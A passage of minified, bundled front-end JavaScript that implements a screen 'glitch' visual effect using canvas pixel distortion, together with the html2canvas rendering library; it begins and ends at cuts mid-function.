a(t)===!0?!0:void d(t,e,n,"not")}function g(t){return t>0}function d(t,e,a,n){throw new Error("glitch(): Expected "+e+" to be "+a+", but it was "+n+".")}var f,m,p,l,b,w,v,k,y=document.createElement("canvas"),I=document.createElement("canvas"),j=y.getContext("2d"),E=I.getContext("2d"),_="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",q=_.split(""),x={};q.forEach(function(t,e){x[t]=e}),window.glitch=t}();
},{}],60:[function(require,module,exports){
var BMDCollections=require("utils/bitmapdata/index"),BitmapData=BMDCollections.BitmapData,Rectangle=BMDCollections.Rectangle,Point=BMDCollections.Point,Rectangle=BMDCollections.Rectangle,ns=require("shared/namespace");require("utils/html2canvas.js"),require("utils/glitch-canvas.js"),module.exports=function(){function t(){var e=Math.ceil(4*Math.random());ns.audioProxy.triggerEvent("glitch_sound_"+e);var i=Math.round(Math.random()*(o.glitchshots.length-1)),r=o.glitchshots[i],s=document.createElement("canvas");$(s).attr("height",$(window).height()),$(s).attr("width",$(window).width()),$(s).css("position","absolute");var l=s.getContext("2d");if(s.className="glitch-overlay",!r)return void setTimeout(t,1e3);l.putImageData(r,0,0),document.body.appendChild(s);var h=Math.round(100*Math.random()+5);setTimeout(function(){$(".glitch-overlay").remove()},h);var u=Math.round(4e3*Math.random()/c+50);c+=4,c>110?n():a&&setTimeout(t,u)}function e(t){function e(t,e){return Math.floor(Math.random()*(e-t)+t)}function n(){var t=Math.random();return.33>t?BitmapDataChannel.GREEN:.66>t?BitmapDataChannel.RED:BitmapDataChannel.BLUE}function a(){var t=new BitmapData(s,l);t.draw(h);var a=new BitmapData(s,l);a.draw(h);var r=c*c/100*s;for(i=0;i<2*c;i++){var u=e(0,l),d=e(1,l/4);d=Math.min(d,l-u);var m=e(-r,r);0!=m&&(0>m?(t.copyPixels(a,new Rectangle(-m,u,s+m,d),new Point(0,u)),t.copyPixels(a,new Rectangle(0,u,-m,d),new Point(s+m,u))):(t.copyPixels(a,new Rectangle(0,u,s,d),new Point(m,u)),t.copyPixels(a,new Rectangle(s-m,u,m,d),new Point(0,u))))}var g=n();t.copyChannel(a,new Rectangle(0,0,s,l),new Point(e(2*-c,2*c),e(2*-c,2*c)),g,g),o.glitchshots.push(t.data)}var r=t.getContext("2d"),c=5,s=$(window).width(),l=$(window).height(),h=(r.getImageData(0,0,s,l),document.createElement("img"));h.onload=a,h.src=t.toDataURL("image/png")}var n,a=!1,o=this;o.screenshots=[],o.glitchshots=[];var r=function(){};o.screenshot=function(){html2canvas(document.body,{onrendered:function(t){o.screenshots.push(t.toDataURL("image/png")),e(t)},onerror:function(){console.log(arguments)}})},o.glitch=function(e,o){n=o,e?(a=!0,setTimeout(t,50)):t()},o.pause=function(){a=!1};var c=1;r()};
},{"shared/namespace":140,"utils/bitmapdata/index":49,"utils/glitch-canvas.js":59,"utils/html2canvas.js":61}],61:[function(require,module,exports){
"use strict";function toPX(t,e,n){var a,r=t.runtimeStyle&&t.runtimeStyle[e],o=t.style;return!/^-?[0-9]+\.?[0-9]*(?:px)?$/i.test(n)&&/^-?\d/.test(n)&&(a=o.left,r&&(t.runtimeStyle.left=t.currentStyle.left),o.left="fontSize"===e?"1em":n||0,n=o.pixelLeft+"px",o.left=a,r&&(t.runtimeStyle.left=r)),/^(thin|medium|thick)$/i.test(n)?n:Math.round(parseFloat(n))+"px"}function asInt(t){return parseInt(t,10)}function parseBackgroundSizePosition(t,e,n,a){if(t=(t||"").split(","),t=t[a||0]||t[0]||"auto",t=_html2canvas.Util.trimText(t).split(" "),"backgroundSize"!==n||t[0]&&!t[0].match(/cover|contain|auto/)){if(t[0]=-1===t[0].indexOf("%")?toPX(e,n+"X",t[0]):t[0],void 0===t[1]){if("backgroundSize"===n)return t[1]="auto",t;t[1]=t[0]}t[1]=-1===t[1].indexOf("%")?toPX(e,n+"Y",t[1]):t[1]}else;return t}function backgroundBoundsFactory(t,e,n,a,r,o){var i,l,s,c,d=_html2canvas.Util.getCSS(e,t,r);if(1===d.length&&(c=d[0],d=[],d[0]=c,d[1]=c),-1!==d[0].toString().indexOf("%"))s=parseFloat(d[0])/100,l=n.width*s,"backgroundSize"!==t&&(l-=(o||a).width*s);else if("backgroundSize"===t)if("auto"===d[0])l=a.width;else if(/contain|cover/.test(d[0])){var h=_html2canvas.Util.resizeBounds(a.width,a.height,n.width,n.height,d[0]);l=h.width,i=h.height}else l=parseInt(d[0],10);else l=parseInt(d[0],10);return"auto"===d[1]?i=l/a.width*a.height:-1!==d[1].toString().indexOf("%")?(s=parseFloat(d[1])/100,i=n.height*s,"backgroundSize"!==t&&(i-=(o||a).height*s)):i=parseInt(d[1],10),[l,i]}function h2cRenderContext(t,e){var n=[];return{storage:n,width:t,height:e,clip:function(){n.push({type:"function",name:"clip",arguments:arguments})},translate:function(){n.push({type:"function",name:"translate",arguments:arguments})},fill:function(){n.push({type:"function",name:"fill",arguments:arguments})},save:function(){n.push({type:"function",name:"save",arguments:arguments})},restore:function(){n.push({type:"function",name:"restore",arguments:arguments})},fillRect:function(){n.push({type:"function",name:"fillRect",arguments:arguments})},createPattern:function(){n.push({type:"function",name:"createPattern",arguments:arguments})},drawShape:function(){var t=[];return n.push({type:"function",name:"drawShape",arguments:t}),{moveTo:function(){t.push({name:"moveTo",arguments:arguments})},lineTo:function(){t.push({name:"lineTo",arguments:arguments})},arcTo:function(){t.push({name:"arcTo",arguments:arguments})},bezierCurveTo:function(){t.push({name:"bezierCurveTo",arguments:arguments})},quadraticCurveTo:function(){t.push({name:"quadraticCurveTo",arguments:arguments})}}},drawImage:function(){n.push({type:"function",name:"drawImage",arguments:arguments})},fillText:function(){n.push({type:"function",name:"fillText",arguments:arguments})},setVariable:function(t,e){return n.push({type:"variable",name:t,arguments:e}),e}}}function h2czContext(t){return{zindex:t,children:[]}}var _html2canvas={},previousElement,computedCSS,html2canvas;_html2canvas.Util={},_html2canvas.Util.log=function(t){_html2canvas.logging&&window.console&&window.console.log&&window.console.log(t)},_html2canvas.Util.trimText=function(t){return function(e){return t?t.apply(e):((e||"")+"").replace(/^\s+|\s+$/g,"")}}(String.prototype.trim),_html2canvas.Util.asFloat=function(t){return parseFloat(t)},function(){var t=/((rgba|rgb)\([^\)]+\)(\s-?\d+px){0,})/g,e=/(-?\d+px)|(#.+)|(rgb\(.+\))|(rgba\(.+\))/g;_html2canvas.Util.parseTextShadows=function(n){if(!n||"none"===n)return[];for(var a=n.match(t),r=[],o=0;a&&o<a.length;o++){var i=a[o].match(e);r.push({color:i[0],offsetX:i[1]?i[1].replace("px",""):0,offsetY:i[2]?i[2].replace("px",""):0,blur:i[3]?i[3].replace("px",""):0})}return r}}(),_html2canvas.Util.parseBackgroundImage=function(t){var e,n,a,r,o,i,l,s,c=" \r\n	",d=[],h=0,u=0,f=function(){e&&('"'===n.substr(0,1)&&(n=n.substr(1,n.length-2)),n&&s.push(n),"-"===e.substr(0,1)&&(r=e.indexOf("-",1)+1)>0&&(a=e.substr(0,r),e=e.substr(r)),d.push({prefix:a,method:e.toLowerCase(),value:o,args:s})),s=[],e=a=n=o=""};f();for(var m=0,p=t.length;p>m;m++)if(i=t[m],!(0===h&&c.indexOf(i)>-1)){switch(i){case'"':l?l===i&&(l=null):l=i;break;case"(":if(l)break;if(0===h){h=1,o+=i;continue}u++;break;case")":if(l)break;if(1===h){if(0===u){h=0,o+=i,f();continue}u--}break;case",":if(l)break;if(0===h){f();continue}if(1===h&&0===u&&!e.match(/^url$/i)){s.push(n),n="",o+=i;continue}}o+=i,0===h?e+=i:n+=i}return f(),d},_html2canvas.Util.Bounds=function(t){var e,n={};return t.getBoundingClientRect&&(e=t.getBoundingClientRect(),n.top=e.top,n.bottom=e.bottom||e.top+e.height,n.left=e.left,n.width=t.offsetWidth,n.height=t.offsetHeight),n},_html2canvas.Util.OffsetBounds=function(t){var e=t.offsetParent?_html2canvas.Util.OffsetBounds(t.offsetParent):{top:0,left:0};return{top:t.offsetTop+e.top,bottom:t.offsetTop+t.offsetHeight+e.top,left:t.offsetLeft+e.left,width:t.offsetWidth,height:t.offsetHeight}},_html2canvas.Util.getCSS=function(t,e,n){previousElement!==t&&(computedCSS=document.defaultView.getComputedStyle(t,null));var a=computedCSS[e];if(/^background(Size|Position)$/.test(e))return parseBackgroundSizePosition(a,t,e,n);if(/border(Top|Bottom)(Left|Right)Radius/.test(e)){var r=a.split(" ");return r.length<=1&&(r[1]=r[0]),r.map(asInt)}return a},_html2canvas.Util.resizeBounds=function(t,e,n,a,r){var o,i,l=n/a,s=t/e;return r&&"auto"!==r?s>l^"contain"===r?(i=a,o=a*s):(o=n,i=n/s):(o=n,i=a),{width:o,height:i}},_html2canvas.Util.BackgroundPosition=function(t,e,n,a,r){var o=backgroundBoundsFactory("backgroundPosition",t,e,n,a,r);return{left:o[0],top:o[1]}},_html2canvas.Util.BackgroundSize=function(t,e,n,a){var r=backgroundBoundsFactory("backgroundSize",t,e,n,a);return{width:r[0],height:r[1]}},_html2canvas.Util.Extend=function(t,e){for(var n in t)t.hasOwnProperty(n)&&(e[n]=t[n]);return e},_html2canvas.Util.Children=function(t){var e;try{e=t.nodeName&&"IFRAME"===t.nodeName.toUpperCase()?t.contentDocument||t.contentWindow.document:function(t){var e=[];return null!==t&&!function(t,e){var n=t.length,a=0;if("number"==typeof e.length)for(var r=e.length;r>a;a++)t[n++]=e[a];else for(;void 0!==e[a];)t[n++]=e[a++];return t.length=n,t}(e,t),e}(t.childNodes)}catch(n){_html2canvas.Util.log("html2canvas.Util.Children failed with exception: "+n.message),e=[]}return e},_html2canvas.Util.isTransparent=function(t){return"transparent"===t||"rgba(0, 0, 0, 0)"===t},_html2canvas.Util.Font=function(){var t={};return function(e,n,a){if(void 0!==t[e+"-"+n])return t[e+"-"+n];var r,o,i,l=a.createElement("div"),s=a.createElement("img"),c=a.createElement("span"),d="Hidden Text";return l.style.visibility="hidden",l.style.fontFamily=e,l.style.fontSize=n,l.style.margin=0,l.style.padding=0,a.body.appendChild(l),s.src="data:image/gif;base64,R0lGODlhAQABAIABAP///wAAACwAAAAAAQABAAACAkQBADs=",s.width=1,s.height=1,s.style.margin=0,s.style.padding=0,s.style.verticalAlign="baseline",c.style.fontFamily=e,c.style.fontSize=n,c.style.margin=0,c.style.padding=0,c.appendChild(a.createTextNode(d)),l.appendChild(c),l.appendChild(s),r=s.offsetTop-c.offsetTop+1,l.removeChild(c),l.appendChild(a.createTextNode(d)),l.style.lineHeight="normal",s.style.verticalAlign="super",o=s.offsetTop-l.offsetTop+1,i={baseline:r,lineWidth:1,middle:o},t[e+"-"+n]=i,a.body.removeChild(l),i}}(),function(){function t(t){return function(n){try{t.addColorStop(n.stop,n.color)}catch(a){e.log(["failed to add color stop: ",a,"; tried to add: ",n])}}}var e=_html2canvas.Util,n={};_html2canvas.Generate=n;var a=[/^(-webkit-linear-gradient)\(([a-z\s]+)([\w\d\.\s,%\(\)]+)\)$/,/^(-o-linear-gradient)\(([a-z\s]+)([\w\d\.\s,%\(\)]+)\)$/,/^(-webkit-gradient)\((linear|radial),\s((?:\d{1,3}%?)\s(?:\d{1,3}%?),\s(?:\d{1,3}%?)\s(?:\d{1,3}%?))([\w\d\.\s,%\(\)\-]+)\)$/,/^(-moz-linear-gradient)\(((?:\d{1,3}%?)\s(?:\d{1,3}%?))([\w\d\.\s,%\(\)]+)\)$/,/^(-webkit-radial-gradient)\(((?:\d{1,3}%?)\s(?:\d{1,3}%?)),\s(\w+)\s([a-z\-]+)([\w\d\.\s,%\(\)]+)\)$/,/^(-moz-radial-gradient)\(((?:\d{1,3}%?)\s(?:\d{1,3}%?)),\s(\w+)\s?([a-z\-]*)([\w\d\.\s,%\(\)]+)\)$/,/^(-o-radial-gradient)\(((?:\d{1,3}%?)\s(?:\d{1,3}%?)),\s(\w+)\s([a-z\-]+)([\w\d\.\s,%\(\)]+)\)$/];n.parseGradient=function(t,e){var n,r,o,i,l,s,c,d,h,u,f,m,p=a.length;for(r=0;p>r&&!(o=t.match(a[r]));r+=1);if(o)switch(o[1]){case"-webkit-linear-gradient":case"-o-linear-gradient":if(n={type:"linear",x0:null,y0:null,x1:null,y1:null,colorStops:[]},l=o[2].match(/\w+/g))for(s=l.length,r=0;s>r;r+=1)switch(l[r]){case"top":n.y0=0,n.y1=e.height;break;case"right":n.x0=e.width,n.x1=0;break;case"bottom":n.y0=e.height,n.y1=0;break;case"left":n.x0=0,n.x1=e.width}if(null===n.x0&&null===n.x1&&(n.x0=n.x1=e.width/2),null===n.y0&&null===n.y1&&(n.y0=n.y1=e.height/2),l=o[3].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\)(?:\s\d{1,3}(?:%|px))?)+/g))for(s=l.length,c=1/Math.max(s-1,1),r=0;s>r;r+=1)d=l[r].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\))\s*(\d{1,3})?(%|px)?/),d[2]?(i=parseFloat(d[2]),i/="%"===d[3]?100:e.width):i=r*c,n.colorStops.push({color:d[1],stop:i});break;case"-webkit-gradient":if(n={type:"radial"===o[2]?"circle":o[2],x0:0,y0:0,x1:0,y1:0,colorStops:[]},l=o[3].match(/(\d{1,3})%?\s(\d{1,3})%?,\s(\d{1,3})%?\s(\d{1,3})%?/),l&&(n.x0=l[1]*e.width/100,n.y0=l[2]*e.height/100,n.x1=l[3]*e.width/100,n.y1=l[4]*e.height/100),l=o[4].match(/((?:from|to|color-stop)\((?:[0-9\.]+,\s)?(?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\)\))+/g))for(s=l.length,r=0;s>r;r+=1)d=l[r].match(/(from|to|color-stop)\(([0-9\.]+)?(?:,\s)?((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\))\)/),i=parseFloat(d[2]),"from"===d[1]&&(i=0),"to"===d[1]&&(i=1),n.colorStops.push({color:d[3],stop:i});break;case"-moz-linear-gradient":if(n={type:"linear",x0:0,y0:0,x1:0,y1:0,colorStops:[]},l=o[2].match(/(\d{1,3})%?\s(\d{1,3})%?/),l&&(n.x0=l[1]*e.width/100,n.y0=l[2]*e.height/100,n.x1=e.width-n.x0,n.y1=e.height-n.y0),l=o[3].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\)(?:\s\d{1,3}%)?)+/g))for(s=l.length,c=1/Math.max(s-1,1),r=0;s>r;r+=1)d=l[r].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\))\s*(\d{1,3})?(%)?/),d[2]?(i=parseFloat(d[2]),d[3]&&(i/=100)):i=r*c,n.colorStops.push({color:d[1],stop:i});break;case"-webkit-radial-gradient":case"-moz-radial-gradient":case"-o-radial-gradient":if(n={type:"circle",x0:0,y0:0,x1:e.width,y1:e.height,cx:0,cy:0,rx:0,ry:0,colorStops:[]},l=o[2].match(/(\d{1,3})%?\s(\d{1,3})%?/),l&&(n.cx=l[1]*e.width/100,n.cy=l[2]*e.height/100),l=o[3].match(/\w+/),d=o[4].match(/[a-z\-]*/),l&&d)switch(d[0]){case"farthest-corner":case"cover":case"":h=Math.sqrt(Math.pow(n.cx,2)+Math.pow(n.cy,2)),u=Math.sqrt(Math.pow(n.cx,2)+Math.pow(n.y1-n.cy,2)),f=Math.sqrt(Math.pow(n.x1-n.cx,2)+Math.pow(n.y1-n.cy,2)),m=Math.sqrt(Math.pow(n.x1-n.cx,2)+Math.pow(n.cy,2)),n.rx=n.ry=Math.max(h,u,f,m);break;case"closest-corner":h=Math.sqrt(Math.pow(n.cx,2)+Math.pow(n.cy,2)),u=Math.sqrt(Math.pow(n.cx,2)+Math.pow(n.y1-n.cy,2)),f=Math.sqrt(Math.pow(n.x1-n.cx,2)+Math.pow(n.y1-n.cy,2)),m=Math.sqrt(Math.pow(n.x1-n.cx,2)+Math.pow(n.cy,2)),n.rx=n.ry=Math.min(h,u,f,m);break;case"farthest-side":"circle"===l[0]?n.rx=n.ry=Math.max(n.cx,n.cy,n.x1-n.cx,n.y1-n.cy):(n.type=l[0],n.rx=Math.max(n.cx,n.x1-n.cx),n.ry=Math.max(n.cy,n.y1-n.cy));break;case"closest-side":case"contain":"circle"===l[0]?n.rx=n.ry=Math.min(n.cx,n.cy,n.x1-n.cx,n.y1-n.cy):(n.type=l[0],n.rx=Math.min(n.cx,n.x1-n.cx),n.ry=Math.min(n.cy,n.y1-n.cy))}if(l=o[5].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\)(?:\s\d{1,3}(?:%|px))?)+/g))for(s=l.length,c=1/Math.max(s-1,1),r=0;s>r;r+=1)d=l[r].match(/((?:rgb|rgba)\(\d{1,3},\s\d{1,3},\s\d{1,3}(?:,\s[0-9\.]+)?\))\s*(\d{1,3})?(%|px)?/),d[2]?(i=parseFloat(d[2]),i/="%"===d[3]?100:e.width):i=r*c,n.colorStops.push({color:d[1],stop:i})}return n},n.Gradient=function(e,n){if(0!==n.width&&0!==n.height){var a,r,o=document.createElement("canvas"),i=o.getContext("2d");if(o.width=n.width,o.height=n.height,a=_html2canvas.Generate.parseGradient(e,n))switch(a.type){case"linear":r=i.createLinearGradient(a.x0,a.y0,a.x1,a.y1),a.colorStops.forEach(t(r)),i.fillStyle=r,i.fillRect(0,0,n.width,n.height);break;case"circle":r=i.createRadialGradient(a.cx,a.cy,0,a.cx,a.cy,a.rx),a.colorStops.forEach(t(r)),i.fillStyle=r,i.fillRect(0,0,n.width,n.height);break;case"ellipse":var l=document.createElement("canvas"),s=l.getContext("2d"),c=Math.max(a.rx,a.ry),d=2*c;l.width=l.height=d,r=s.createRadialGradient(a.rx,a.ry,0,a.rx,a.ry,c),a.colorStops.forEach(t(r)),s.fillStyle=r,s.fillRect(0,0,d,d),i.fillStyle=a.colorStops[a.colorStops.length-1].color,i.fillRect(0,0,o.width,o.height),i.drawImage(l,a.cx-a.rx,a.cy-a.ry,2*a.rx,2*a.ry)}return o}},n.ListAlpha=function(t){var e,n="";do e=t%26,n=String.fromCharCode(e+64)+n,t/=26;while(26*t>26);return n},n.ListRoman=function(t){var e,n=["M","CM","D","CD","C","XC","L","XL","X","IX","V","IV","I"],a=[1e3,900,500,400,100,90,50,40,10,9,5,4,1],r="",o=n.length;if(0>=t||t>=4e3)return t;for(e=0;o>e;e+=1)for(;t>=a[e];)t-=a[e],r+=n[e];return r}}(),_html2canvas.Parse=function(t,e){function n(){return Math.max(Math.max(rt.body.scrollWidth,rt.documentElement.scrollWidth),Math.max(rt.body.offsetWidth,rt.documentElement.offsetWidth),Math.max(rt.body.clientWidth,rt.documentElement.clientWidth))}function a(){return Math.max(Math.max(rt.body.scrollHeight,rt.documentElement.scrollHeight),Math.max(rt.body.offsetHeight,rt.documentElement.offsetHeight),Math.max(rt.body.clientHeight,rt.documentElement.clientHeight))}function r(t,e){var n=parseInt(ct(t,e),10);return isNaN(n)?0:n}function o(t,e,n,a,r,o){"transparent"!==o&&(t.setVariable("fillStyle",o),t.fillRect(e,n,a,r),at+=1)}function i(t,e,n){return t.length>0?e+n.toUpperCase():void 0}function l(t,e){switch(e){case"lowercase":return t.toLowerCase();case"capitalize":return t.replace(/(^|\s|:|-|\(|\))([a-z])/g,i);case"uppercase":return t.toUpperCase();default:return t}}function s(t){return/^(normal|none|0px)$/.test(t)}function c(t,e,n,a){null!==t&&ot.trimText(t).length>0&&(a.fillText(t,e,n),at+=1)}function d(t,e,n,a){var r=!1,o=ct(e,"fontWeight"),i=ct(e,"fontFamily"),l=ct(e,"fontSize"),s=ot.parseTextShadows(ct(e,"textShadow"));switch(parseInt(o,10)){case 401:o="bold";break;case 400:o="normal"}return t.setVariable("fillStyle",a),t.setVariable("font",[ct(e,"fontStyle"),ct(e,"fontVariant"),o,l,i].join(" ")),t.setVariable("textAlign",r?"right":"left"),s.length&&(t.setVariable("shadowColor",s[0].color),t.setVariable("shadowOffsetX",s[0].offsetX),t.setVariable("shadowOffsetY",s[0].offsetY),t.setVariable("shadowBlur",s[0].blur)),"none"!==n?ot.Font(i,l,rt):void 0}function h(t,e,n,a,r){switch(e){case"underline":o(t,n.left,Math.round(n.top+a.baseline+a.lineWidth),n.width,1,r);break;case"overline":o(t,n.left,Math.round(n.top),n.width,1,r);break;case"line-through":o(t,n.left,Math.ceil(n.top+a.middle+a.lineWidth),n.width,1,r)}}function u(t,e,n,a,r){var o;if(it.rangeBounds&&!r)("none"!==n||0!==ot.trimText(e).length)&&(o=f(e,t.node,t.textOffset)),t.textOffset+=e.length;else if(t.node&&"string"==typeof t.node.nodeValue){var i=a?t.node.splitText(e.length):null;o=m(t.node,r),t.node=i}return o}function f(t,e,n){var a=rt.createRange();return a.setStart(e,n),a.setEnd(e,n+t.length),a.getBoundingClientRect()}function m(t,e){var n=t.parentNode,a=rt.createElement("wrapper"),r=t.cloneNode(!0);a.appendChild(t.cloneNode(!0)),n.replaceChild(a,t);var o=e?ot.OffsetBounds(a):ot.Bounds(a);return n.replaceChild(r,a),o}function p(t,n,a){var r,o,i=a.ctx,f=ct(t,"color"),m=ct(t,"textDecoration"),p=ct(t,"textAlign"),g={node:n,textOffset:0};ot.trimText(n.nodeValue).length>0&&(n.nodeValue=l(n.nodeValue,ct(t,"textTransform")),p=p.replace(["-webkit-auto"],["auto"]),o=!e.letterRendering&&/^(left|right|justify|auto)$/.test(p)&&s(ct(t,"letterSpacing"))?n.nodeValue.split(/(\b| )/):n.nodeValue.split(""),r=d(i,t,m,f),e.chinese&&o.forEach(function(t,e){/.*[\u4E00-\u9FA5].*$/.test(t)&&(t=t.split(""),t.unshift(e,1),o.splice.apply(o,t))}),o.forEach(function(t,e){var n=u(g,t,m,e<o.length-1,a.transform.matrix);n&&(c(t,n.left,n.bottom,i),h(i,m,n,r,f))}))}function g(t,e){var n,a,r=rt.createElement("boundelement");return r.style.display="inline",n=t.style.listStyleType,t.style.listStyleType="none",r.appendChild(rt.createTextNode(e)),t.insertBefore(r,t.firstChild),a=ot.Bounds(r),t.removeChild(r),t.style.listStyleType=n,a}function w(t){var e=-1,n=1,a=t.parentNode.childNodes;if(t.parentNode){for(;a[++e]!==t;)1===a[e].nodeType&&n++;return n}return-1}function v(t,e){var n,a=w(t);switch(e){case"decimal":n=a;break;case"decimal-leading-zero":n=1===a.toString().length?a="0"+a.toString():a.toString();break;case"upper-roman":n=_html2canvas.Generate.ListRoman(a);break;case"lower-roman":n=_html2canvas.Generate.ListRoman(a).toLowerCase();break;case"lower-alpha":n=_html2canvas.Generate.ListAlpha(a).toLowerCase();break;case"upper-alpha":n=_html2canvas.Generate.ListAlpha(a)}return n+". "}function y(t,e,n){var a,r,o,i=e.ctx,l=ct(t,"listStyleType");if(/^(decimal|decimal-leading-zero|upper-alpha|upper-latin|upper-roman|lower-alpha|lower-greek|lower-latin|lower-roman)$/i.test(l)){if(r=v(t,l),o=g(t,r),d(i,t,"none",ct(t,"color")),"inside"!==ct(t,"listStylePosition"))return;i.setVariable("textAlign","left"),a=n.left,c(r,a,o.bottom,i)}}function b(e){var n=t[e];return n&&n.succeeded===!0?n.img:!1}function x(t,e){var n=Math.max(t.left,e.left),a=Math.max(t.top,e.top),r=Math.min(t.left+t.width,e.left+e.width),o=Math.min(t.top+t.height,e.top+e.height);return{left:n,top:a,width:r-n,height:o-a}}function k(t,e,n){var a,r="static"!==e.cssPosition,o=r?ct(t,"zIndex"):"auto",i=ct(t,"opacity"),l="none"!==ct(t,"cssFloat");e.zIndex=a=h2czContext(o),a.isPositioned=r,a.isFloated=l,a.opacity=i,a.ownStacking="auto"!==o||1>i,n&&n.zIndex.children.push(e)}function C(t,e,n,a,o){var i=r(e,"paddingLeft"),l=r(e,"paddingTop"),s=r(e,"paddingRight"),c=r(e,"paddingBottom");A(t,n,0,0,n.width,n.height,a.left+i+o[3].width,a.top+l+o[0].width,a.width-(o[1].width+o[3].width+i+s),a.height-(o[0].width+o[2].width+l+c))}function T(t){return["Top","Right","Bottom","Left"].map(function(e){return{width:r(t,"border"+e+"Width"),color:ct(t,"border"+e+"Color")}})}function S(t){return["TopLeft","TopRight","BottomRight","BottomLeft"].map(function(e){return ct(t,"border"+e+"Radius")})}function R(t,e,n,a){var r=function(t,e,n){return{x:t.x+(e.x-t.x)*n,y:t.y+(e.y-t.y)*n}};return{start:t,startControl:e,endControl:n,end:a,subdivide:function(o){var i=r(t,e,o),l=r(e,n,o),s=r(n,a,o),c=r(i,l,o),d=r(l,s,o),h=r(c,d,o);return[R(t,i,c,h),R(h,d,s,a)]},curveTo:function(t){t.push(["bezierCurve",e.x,e.y,n.x,n.y,a.x,a.y])},curveToReversed:function(a){a.push(["bezierCurve",n.x,n.y,e.x,e.y,t.x,t.y])}}}function E(t,e,n,a,r,o,i){e[0]>0||e[1]>0?(t.push(["line",a[0].start.x,a[0].start.y]),a[0].curveTo(t),a[1].curveTo(t)):t.push(["line",o,i]),(n[0]>0||n[1]>0)&&t.push(["line",r[0].start.x,r[0].start.y])}function M(t,e,n,a,r,o,i){var l=[];return e[0]>0||e[1]>0?(l.push(["line",a[1].start.x,a[1].start.y]),a[1].curveTo(l)):l.push(["line",t.c1[0],t.c1[1]]),n[0]>0||n[1]>0?(l.push(["line",o[0].start.x,o[0].start.y]),o[0].curveTo(l),l.push(["line",i[0].end.x,i[0].end.y]),i[0].curveToReversed(l)):(l.push(["line",t.c2[0],t.c2[1]]),l.push(["line",t.c3[0],t.c3[1]])),e[0]>0||e[1]>0?(l.push(["line",r[1].end.x,r[1].end.y]),r[1].curveToReversed(l)):l.push(["line",t.c4[0],t.c4[1]]),l}function I(t,e,n){var a=t.left,r=t.top,o=t.width,i=t.height,l=e[0][0],s=e[0][1],c=e[1][0],d=e[1][1],h=e[2][0],u=e[2][1],f=e[3][0],m=e[3][1],p=o-c,g=i-u,w=o-h,v=i-m;return{topLeftOuter:ut(a,r,l,s).topLeft.subdivide(.5),topLeftInner:ut(a+n[3].width,r+n[0].width,Math.max(0,l-n[3].width),Math.max(0,s-n[0].width)).topLeft.subdivide(.5),topRightOuter:ut(a+p,r,c,d).topRight.subdivide(.5),topRightInner:ut(a+Math.min(p,o+n[3].width),r+n[0].width,p>o+n[3].width?0:c-n[3].width,d-n[0].width).topRight.subdivide(.5),bottomRightOuter:ut(a+w,r+g,h,u).bottomRight.subdivide(.5),bottomRightInner:ut(a+Math.min(w,o+n[3].width),r+Math.min(g,i+n[0].width),Math.max(0,h-n[1].width),Math.max(0,u-n[2].width)).bottomRight.subdivide(.5),bottomLeftOuter:ut(a,r+v,f,m).bottomLeft.subdivide(.5),bottomLeftInner:ut(a+n[3].width,r+v,Math.max(0,f-n[3].width),Math.max(0,m-n[2].width)).bottomLeft.subdivide(.5)}}function _(t,e,n,a,r){var o=ct(t,"backgroundClip"),i=[];switch(o){case"content-box":case"padding-box":E(i,a[0],a[1],e.topLeftInner,e.topRightInner,r.left+n[3].width,r.top+n[0].width),E(i,a[1],a[2],e.topRightInner,e.bottomRightInner,r.left+r.width-n[1].width,r.top+n[0].width),E(i,a[2],a[3],e.bottomRightInner,e.bottomLeftInner,r.left+r.width-n[1].width,r.top+r.height-n[2].width),E(i,a[3],a[0],e.bottomLeftInner,e.topLeftInner,r.left+n[3].width,r.top+r.height-n[2].width);break;default:E(i,a[0],a[1],e.topLeftOuter,e.topRightOuter,r.left,r.top),E(i,a[1],a[2],e.topRightOuter,e.bottomRightOuter,r.left+r.width,r.top),E(i,a[2],a[3],e.bottomRightOuter,e.bottomLeftOuter,r.left+r.width,r.top+r.height),E(i,a[3],a[0],e.bottomLeftOuter,e.topLeftOuter,r.left,r.top+r.height)}return i}function L(t,e,n){var a,r,o,i,l,s,c=e.left,d=e.top,h=e.width,u=e.height,f=S(t),m=I(e,f,n),p={clip:_(t,m,n,f,e),borders:[]};for(a=0;4>a;a++)if(n[a].width>0){switch(r=c,o=d,i=h,l=u-n[2].width,a){case 0:l=n[0].width,s=M({c1:[r,o],c2:[r+i,o],c3:[r+i-n[1].width,o+l],c4:[r+n[3].width,o+l]},f[0],f[1],m.topLeftOuter,m.topLeftInner,m.topRightOuter,m.topRightInner);break;case 1:r=c+h-n[1].width,i=n[1].width,s=M({c1:[r+i,o],c2:[r+i,o+l+n[2].width],c3:[r,o+l],c4:[r,o+n[0].width]},f[1],f[2],m.topRightOuter,m.topRightInner,m.bottomRightOuter,m.bottomRightInner);break;case 2:o=o+u-n[2].width,l=n[2].width,s=M({c1:[r+i,o+l],c2:[r,o+l],c3:[r+n[3].width,o],c4:[r+i-n[3].width,o]},f[2],f[3],m.bottomRightOuter,m.bottomRightInner,m.bottomLeftOuter,m.bottomLeftInner);break;case 3:i=n[3].width,s=M({c1:[r,o+l+n[2].width],c2:[r,o],c3:[r+i,o+n[0].width],c4:[r+i,o+l]},f[3],f[0],m.bottomLeftOuter,m.bottomLeftInner,m.topLeftOuter,m.topLeftInner)}p.borders.push({args:s,color:n[a].color})}return p}function O(t,e){var n=t.drawShape();return e.forEach(function(t,e){n[0===e?"moveTo":t[0]+"To"].apply(null,t.slice(1))}),n}function z(t,e,n){"transparent"!==n&&(t.setVariable("fillStyle",n),O(t,e),t.fill(),at+=1)}function B(t,e,n){var 